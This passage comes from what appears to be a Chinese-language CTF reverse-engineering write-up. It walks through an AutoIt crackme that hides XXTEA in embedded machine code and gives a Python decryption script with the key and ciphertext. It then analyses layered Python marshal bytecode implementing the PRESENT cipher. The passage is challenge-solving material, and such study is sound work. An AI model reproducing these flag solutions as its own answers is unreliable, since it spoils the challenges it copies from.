class="line">$ENCRYPT = ENC ( $STR , $KEY )</span><br><span class="line">If $ENCRYPT == $CIPHERTEXT Then</span><br><span class="line">MsgBox ( &quot;&quot; , &quot;&quot; , &quot;correct&quot; )</span><br><span class="line">ContinueCase</span><br><span class="line">EndIf</span><br><span class="line">MsgBox ( &quot;&quot; , &quot;&quot; , &quot;wrong&quot; )</span><br><span class="line">EndSwitch</span><br><span class="line">WEnd</span><br></pre></td></tr></table></figure><p><strong>定义一个机器码 OPCODE</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Local $OPCODE = &quot;0x83EC14B83400000099...&quot; </span><br></pre></td></tr></table></figure><ul><li>这是嵌入在脚本里的 <strong>x86汇编机器码</strong>。</li><li>实际上就是一个加密函数的实现（比如某种对称加密：TEA、XTEA 或 AES 的变种）。</li><li>脚本不会自己实现算法，而是通过调用这段机器码来执行。</li></ul><p><strong>创建结构体作为缓冲区</strong></p><ul><li><code>$CODEBUFFER</code>：存储这段机器码。</li><li><code>$V</code>：存储待加密的数据，补齐到 4 字节对齐。</li><li><code>$K</code>：存储 16 字节的密钥。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">opcode =<span class="string">&quotquot;</span></span><br><span class="line">hex_bytes = binascii.a2b_hex(opcode)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;enc.dll&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(hex_bytes)</span><br></pre></td></tr></table></figure><p>把机器码携带文件方便我们IDA打开分析</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251002204839046.png" alt="image-20251002204839046"></p><p>xxtea</p><p><code>6</code> 是 XXTEA 设计里保证最小轮数的常数，目的是给最少轮数的安全保证（<code>6 + 52/n</code>）。</p><p><code>n = 10</code> 是因为密文长 40 字节，而 XXTEA 的处理单位是 4 字节一个 <code>uint32</code>，所以需要 40 ÷ 4 &#x3D; 10 个元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v = struct.unpack(&#x27;&lt;10I&#x27;, ct)</span><br></pre></td></tr></table></figure><p><code>&lt;</code> 表示 <strong>小端序</strong>（least-significant byte first，和 x86&#x2F;Windows 一致）。</p><p><code>10I</code> 表示读取 **10 个 unsigned int (32 位无符号整数)**。</p><p><em>dis</em> 模块是 Python 的字节码反汇编器，用于分析 CPython 的字节码。字节码是 Python 代码在解释器中运行的中间形式，<em>dis</em> 模块可以帮助开发者理解代码的底层执行逻辑，尤其在性能优化和调试中非常有用。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MX</span>(<span class="params">z, y, total, key, p, e</span>):</span><br><span class="line">    temp1 = (z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    temp2 = (total.value ^ y.value) + (key[(p &amp; <span class="number">3</span>) ^ e.value] ^ z.value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c_uint32(temp1 ^ temp2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">n, v, key</span>):</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line"></span><br><span class="line">    total = c_uint32(-rounds * delta)</span><br><span class="line">    y = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    e = c_uint32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">        e.value = (total.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = c_uint32(v[p - <span class="number">1</span>])</span><br><span class="line">            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value</span><br><span class="line">            y.value = v[p]</span><br><span class="line">        z = c_uint32(v[n - <span class="number">1</span>])</span><br><span class="line">        v[<span class="number">0</span>] = c_uint32(v[<span class="number">0</span>] - MX(z, y, total, key, <span class="number">0</span>, e).value).value</span><br><span class="line">        y.value = v[<span class="number">0</span>]</span><br><span class="line">        total.value += delta</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ct = <span class="string">&quot;7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675&quot;</span></span><br><span class="line">    ct = binascii.a2b_hex(ct)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    key = <span class="string">&quot;Wowww111auUu3&quot;</span></span><br><span class="line">    v = struct.unpack(<span class="string">&#x27;&lt;10I&#x27;</span>, ct)</span><br><span class="line">    k = struct.unpack(<span class="string">&#x27;&lt;4I&#x27;</span>, key.encode() + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">3</span>)</span><br><span class="line">    v = <span class="built_in">list</span>(v)</span><br><span class="line">    k = <span class="built_in">list</span>(k)</span><br><span class="line">    n = <span class="number">10</span></span><br><span class="line">    res = decrypt(n, v, k)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(r.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>).decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="marshal"><a href="#marshal" class="headerlink" title="marshal"></a>marshal</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import marshal</span><br><span class="line"># import pickle</span><br><span class="line"></span><br><span class="line">code = b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#x27;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 \x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#x27;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#x27;</span><br><span class="line"></span><br><span class="line">l = marshal.loads(code)</span><br><span class="line">exec(l)</span><br></pre></td></tr></table></figure><p>之前做过一道类似的题在seccon里</p><p>用 <code>marshal.loads</code> 把 CodeObject 加载出来，但<strong>不要执行</strong>。</p><p>然后用 <code>dis.dis()</code>（反汇编）或者 <code>uncompyle6 / decompyle3</code> 把字节码翻译成人能读的 Python 伪代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(dis.dis(l))</span><br></pre></td></tr></table></figure><p>发现中间有一大块</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251002215401886.png" alt="image-20251002215401886"></p><p>定义了 <code>Sbox</code>（16 项，正好是 PRESENT 密码的 S 盒）</p><p>定义了 <code>PBox</code>（64 项，正好是 PRESENT 的 64-bit 置换层）以及各自的逆表 <code>Sbox_inv</code>、<code>PBox_inv</code></p><p><strong>在常量 #68 里塞了“第二层”字节码</strong>（一个更长的 <code>b&#39;c\x00\x00...&#39;</code>），然后 <code>marshal.loads(...); exec(...)</code> 去执行它</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line">code = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#x27;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 